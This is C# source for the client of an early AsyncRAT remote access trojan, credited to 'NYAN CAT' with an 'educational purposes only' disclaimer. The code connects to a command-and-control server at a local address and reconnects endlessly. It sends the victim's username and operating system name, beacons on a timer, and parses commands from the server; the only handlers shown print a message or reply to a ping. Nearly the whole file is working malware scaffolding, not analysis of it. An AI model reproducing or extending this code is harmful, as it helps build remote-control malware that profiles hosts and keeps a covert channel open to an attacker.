﻿using AsyncRAT_Sharp.MessagePack;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.Devices;
using System;
using System.IO;
using System.Net.Sockets;
using System.Text;
using System.Threading;


//       │ Author     : NYAN CAT
//       │ Name       : AsyncRAT // Simple Socket

//       Contact Me   : https://github.com/NYAN-x-CAT

//       This program Is distributed for educational purposes only.


namespace Client
{
    class Program
    {
        public static Socket client { get; set; }
        public static byte[] Buffer { get; set; }
        public static long Buffersize { get; set; }
        public static bool BufferRecevied { get; set; }
        public static Timer Tick { get; set; }
        public static MemoryStream MS { get; set; }

        static void Main(string[] args)
        {
            Console.Title = "AsyncRAT | Client";
            InitializeClient();
            while (true)
            {
                Thread.Sleep(1000);
            }
        }

        public static void InitializeClient()
        {
            try
            {
                client = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                client.ReceiveBufferSize = 50 * 1024;
                client.SendBufferSize = 50 * 1024;
                client.ReceiveTimeout = -1;
                client.SendTimeout = -1;
                client.Connect("127.0.0.1", 8080);
                Console.WriteLine("Connected!");
                Buffer = new byte[1];
                Buffersize = 0;
                BufferRecevied = false;
                MS = new MemoryStream();
                BeginSend(SendInfo());
                TimerCallback T = new TimerCallback(Ping);
                Tick = new Timer(T, null, 15000, 30000);
                client.BeginReceive(Buffer, 0, Buffer.Length, SocketFlags.None, ReadServertData, null);
            }
            catch
            {
                Console.WriteLine("Disconnected!");
                Thread.Sleep(new Random().Next(5000));
                try
                {
                    client.Dispose();
                }
                catch { }
                InitializeClient();
            }
        }

        public static byte[] SendInfo()
        {
            MsgPack msgpack = new MsgPack();
            msgpack.ForcePathObject("Packet").AsString = "ClientInfo";
            msgpack.ForcePathObject("User").AsString = Environment.UserName.ToString();
            msgpack.ForcePathObject("OS").AsString = new ComputerInfo().OSFullName.ToString();
            return msgpack.Encode2Bytes();
        }

        public static void ReadServertData(IAsyncResult ar)
        {
            try
            {
                if (client.Connected == false)
                {
                    Tick.Dispose();
                    client.Close();
                    client.Dispose();
                    MS.Dispose();
                    InitializeClient();
                }

                int Recevied = client.EndReceive(ar);

                if (Recevied > 0)
                {

                    if (BufferRecevied == false)
                    {
                        if (Buffer[0] == 0)
                        {
                            Buffersize = Convert.ToInt64(Encoding.UTF8.GetString(MS.ToArray()));
                            MS.Dispose();
                            MS = new MemoryStream();
                            if (Buffersize > 0)
                            {
                                Buffer = new byte[Buffersize - 1];
                                BufferRecevied = true;
                            }
                        }
                        else
                        {

                            MS.Write(Buffer, 0, Buffer.Length);
                        }
                    }
                    else
                    {
                        MS.Write(Buffer, 0, Recevied);
                        if (MS.Length == Buffersize)
                        {
                            ThreadPool.QueueUserWorkItem(Read, MS.ToArray());
                            MS.Dispose();
                            MS = new MemoryStream();
                            Buffer = new byte[1];
                            Buffersize = 0;
                            BufferRecevied = false;
                        }
                    }
                }
                else
                {
                    Tick.Dispose();
                    client.Close();
                    client.Dispose();
                    MS.Dispose();
                    InitializeClient();
                }
                client.BeginReceive(Buffer, 0, Buffer.Length, SocketFlags.None, ReadServertData, null);
            }
            catch
            {
                Tick.Dispose();
                client.Close();
                client.Dispose();
                MS.Dispose();
                InitializeClient();
            }
        }

        public static void Read(object Data)
        {
            MsgPack unpack_msgpack = new MsgPack();
            unpack_msgpack.DecodeFromBytes((byte[])Data);
            Console.WriteLine("I recevied a packet from server: " + unpack_msgpack.ForcePathObject("Packet").AsString);
            switch (unpack_msgpack.ForcePathObject("Packet").AsString)
            {
                case "MessageBox":
                    {
                       Console.WriteLine(unpack_msgpack.ForcePathObject("Message").AsString);
                    }
                    break;

                case "Ping":
                    {
                        Console.WriteLine(unpack_msgpack.ForcePathObject("Message").AsString);
                    }
                    break;
            }
        }

        public static void Ping(object obj)
        {
            MsgPack msgpack = new MsgPack();
            msgpack.ForcePathObject("Packet").AsString = "Ping";
            msgpack.ForcePathObject("Message").AsString = DateTime.Now.ToLongTimeString().ToString();
            BeginSend(msgpack.Encode2Bytes());
        }

        public static void BeginSend(byte[] Msgs)
        {
            if (client.Connected)
            {
                try
                {
                    using (MemoryStream MS = new MemoryStream())
                    {
                        byte[] buffer = Msgs;
                        byte[] buffersize = Encoding.UTF8.GetBytes(buffer.Length.ToString() + Strings.ChrW(0));
                        MS.Write(buffersize, 0, buffersize.Length);
                        MS.Write(buffer, 0, buffer.Length);

                        client.Poll(-1, SelectMode.SelectWrite);
                        client.BeginSend(MS.ToArray(), 0, Convert.ToInt32(MS.Length), SocketFlags.None, new AsyncCallback(EndSend), null);
                    }
                }
                catch
                {
                    Tick.Dispose();
                    client.Close();
                    client.Dispose();
                    MS.Dispose();
                    InitializeClient();
                }
            }
        }

        public static void EndSend(IAsyncResult ar)
        {
            try
            {
                client.EndSend(ar);
            }
            catch
            { }
        }
    }
}